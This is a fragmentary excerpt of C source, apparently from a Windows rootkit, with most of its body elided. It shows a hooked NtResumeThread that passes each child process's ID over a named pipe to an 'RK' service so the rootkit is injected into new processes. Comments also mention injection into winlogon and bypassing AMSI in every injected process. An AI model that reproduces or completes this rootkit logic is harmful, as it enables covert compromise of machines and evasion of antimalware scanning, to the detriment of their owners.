...
static NTSTATUS NTAPI HookedNtResumeThread(HANDLE thread, PULONG suspendCount)
{
	...
	//   Injection cannot be performed here. An injection request is sent to the RK service through a named pipe.
	// Else:
	...
	if (processId != GetCurrentProcessId()) // If NtResumeThread is called on this process, it is not a child process
	{
		...
		{
			// Call the RK service and pass the process ID.
			...
			if (pipe != INVALID_HANDLE_VALUE)
			{
				...
				// This bug was introduced after injecting the RK service into winlogon, rather than in a hollowed process.
...
{
	// Bypass AMSI in every process that is injected with RK.
...
static DWORD WINAPI WriteChildProcessPipeThread(LPVOID parameter)
{
	...
	// Send the process ID to the RK service.
	DWORD bytesWritten;
	WriteFile(pipe, &processId, sizeof(DWORD), &bytesWritten, NULL);

	// Wait for the response. NtResumeThread should be called after RK is injected.
	BYTE returnValue;
	DWORD bytesRead;
